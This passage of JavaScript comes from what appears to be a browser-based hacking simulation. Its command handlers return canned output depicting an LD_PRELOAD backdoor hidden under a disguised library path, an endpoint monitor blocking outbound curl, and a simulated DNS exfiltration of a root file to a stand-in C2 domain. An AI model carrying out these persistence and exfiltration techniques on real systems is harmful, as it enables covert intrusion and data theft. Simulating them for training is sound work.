             |-518 /var/lib/cerberus/agent.bin (hooks worker)
             \`-621 /var/lib/cerberus/agent.bin (net monitor)`;
            }
            if (sub === 'restart' && svc.includes('vanguard-health')) {
                if (C9Config._persistenceInstalled && C9Config._context === 'root') {
                    return `[+] vanguard-health restarted.
[+] LD_PRELOAD=/lib/x86_64-linux-gnu/.cache/libaudit_hook.so loaded by crond at startup.
[+] Backdoor is active.`;
                }
                return `[+] vanguard-health restarted.`;
            }
            return sub + ': ' + svc;
        },

        'curl': function(args) {
            if (C9Config._context !== 'attacker') {
                // Outbound from target — Cerberus blocks external
                const url = args.find(a => !a.startsWith('-')) || '';
                if (!url.startsWith('http://10.') && !url.startsWith('http://172.')) {
                    return C9Config._cerberusCheck('net_suspect', url) || 'curl: (7) Failed to connect: Network unreachable';
                }
                return 'curl: (7) Failed to connect';
            }
            return null; // fall through to built-in on attacker
        },

        'python3': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('dns_exfil.py') && fullCmd.includes('deployment_manifest')) {
                // Proxy to dns_exfil command handler
                return C9Config.commands.dns_exfil(['--file', '/root/deployment_manifest.txt', '--domain', 'c2.vg'], term, engine);
            }
            return 'python3: command available. Use: python3 dns_exfil.py <file>';
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#8e44ad; border-bottom:2px solid #ddd; background:#f5f0fa;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
